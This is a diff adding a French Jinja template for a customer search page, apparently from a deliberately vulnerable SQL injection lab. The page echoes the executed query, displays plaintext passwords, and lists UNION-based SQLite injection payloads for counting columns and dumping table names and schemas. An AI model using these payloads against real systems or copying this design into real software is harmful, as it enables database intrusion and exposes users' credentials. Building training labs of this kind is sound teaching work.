@@ -1,0 +1,66 @@
+{% extends 'base.html' %}
+
+{% block title %}Clients{% endblock %}
+
+{% block content %}
+<div class="card">
+    <h2>Recherche de Clients</h2>
+
+    <form action="{{ prefix }}/users" method="get" class="search-form">
+        <input type="text" name="search" value="{{ search_query }}" placeholder="Rechercher par nom ou email...">
+        <button type="submit">Rechercher</button>
+    </form>
+
+    {% if query %}
+    <div class="query-display">
+        <strong>Requete executee:</strong><br>
+        {{ query }}
+    </div>
+    {% endif %}
+</div>
+
+<div class="card">
+    <h2>Liste des Clients ({{ users|length }} resultats)</h2>
+
+    {% if error %}
+    <div class="alert alert-danger">{{ error }}</div>
+    {% endif %}
+
+    <table>
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Nom</th>
+                <th>Email</th>
+                <th>Mot de passe</th>
+                <th>Date</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for user in users %}
+            <tr>
+                <td>{{ user[0] }}</td>
+                <td>{{ user[1] }}</td>
+                <td>{{ user[2] }}</td>
+                <td>{{ user[3] }}</td>
+                <td>{{ user[4] }}</td>
+            </tr>
+            {% else %}
+            <tr>
+                <td colspan="5" style="text-align: center;">Aucun resultat</td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
+
+<div class="card">
+    <h2>Injections UNION possibles</h2>
+    <ul style="list-style: none; padding: 0;">
+        <li style="margin-bottom: 0.5rem;"><code>' ORDER BY 5--</code> - Determiner le nombre de colonnes</li>
+        <li style="margin-bottom: 0.5rem;"><code>' UNION SELECT 1,2,3,4,5--</code> - Test UNION</li>
+        <li style="margin-bottom: 0.5rem;"><code>' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'--</code> - Lister les tables</li>
+        <li style="margin-bottom: 0.5rem;"><code>' UNION SELECT 1,sql,3,4,5 FROM sqlite_master--</code> - Structure des tables</li>
+    </ul>
+</div>
+{% endblock %}
